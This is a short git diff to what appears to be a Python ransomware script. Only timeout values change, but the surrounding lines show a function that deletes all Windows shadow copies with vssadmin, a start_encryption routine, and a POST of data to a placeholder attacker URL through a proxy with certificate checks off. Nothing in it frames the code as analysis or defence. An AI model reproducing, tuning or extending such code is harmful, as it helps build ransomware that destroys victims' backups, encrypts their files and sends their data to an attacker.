@@ -271,7 +271,7 @@ def delete_shadow_copy():
     execute_command("vssadmin delete shadows /all /quiet")
 
 
-def check_connection(url="http://www.google.com/", timeout=5):
+def check_connection(url="http://www.google.com/", timeout=30):
     try:
         response = requests.get(url, timeout=timeout)
         if response.status_code == 200:
@@ -334,7 +334,7 @@ def start_encryption():
     } # replace with your proxy if you have one
 
     try:
-        requests.post(YOUR_URL, data=data, proxies=proxies, verify=False, timeout=10)
+        requests.post(YOUR_URL, data=data, proxies=proxies, verify=False, timeout=30)
     except requests.exceptions.RequestException as e:
         print(f"Error sending data: {e}")
 
